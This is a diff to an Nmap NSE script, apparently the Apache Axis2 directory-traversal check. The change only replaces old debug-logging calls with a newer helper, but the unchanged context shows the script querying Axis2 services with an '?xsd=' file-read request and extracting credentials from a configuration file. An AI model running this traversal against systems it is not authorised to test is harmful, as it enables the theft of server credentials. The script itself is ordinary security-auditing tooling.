@@ -120,7 +120,7 @@ action = function(host, port)
 
   --check this is an axis2 installation
   if not(check_installation(host, port, basepath.."listServices")) then
-    stdnse.print_debug(1, "%s: This does not look like an Apache Axis2 installation.", SCRIPT_NAME)
+    stdnse.debug1("This does not look like an Apache Axis2 installation.")
     return
   end
 
@@ -132,18 +132,18 @@ action = function(host, port)
   --generate debug info for services and select first one to be used in the request
   if #services > 0 then
     for _, servname in pairs(services) do
-      stdnse.print_debug(1, "%s: Service found: %s", SCRIPT_NAME, servname)
+      stdnse.debug1("Service found: %s", servname)
     end
     selected_service = services[1]
   else
     if nmap.verbosity() >= 2 then
-      stdnse.print_debug(1, "%s: There are no services available. We can't exploit this", SCRIPT_NAME)
+      stdnse.debug1("There are no services available. We can't exploit this")
     end
     return
   end
 
   --Use selected service and exploit
-  stdnse.print_debug(1, "%s: Querying service: %s", SCRIPT_NAME, selected_service)
+  stdnse.debug1("Querying service: %s", selected_service)
   req = http.get(host, port, basepath..selected_service.."?xsd="..rfile)
   stdnse.print_debug(2, "%s: Query -> %s", SCRIPT_NAME, basepath..selected_service.."?xsd="..rfile)
 
@@ -168,7 +168,7 @@ action = function(host, port)
       if extract_st then
         output[#output+1] = extract_msg
       else
-        stdnse.print_debug(1, "%s: Credentials not found in configuration file", SCRIPT_NAME)
+        stdnse.debug1("Credentials not found in configuration file")
       end
     end
 
@@ -182,7 +182,7 @@ action = function(host, port)
       end
      end
   else
-    stdnse.print_debug(1, "%s: Request did not return status 200. File might not be found or unreadable", SCRIPT_NAME)
+    stdnse.debug1("Request did not return status 200. File might not be found or unreadable")
     return
   end
 
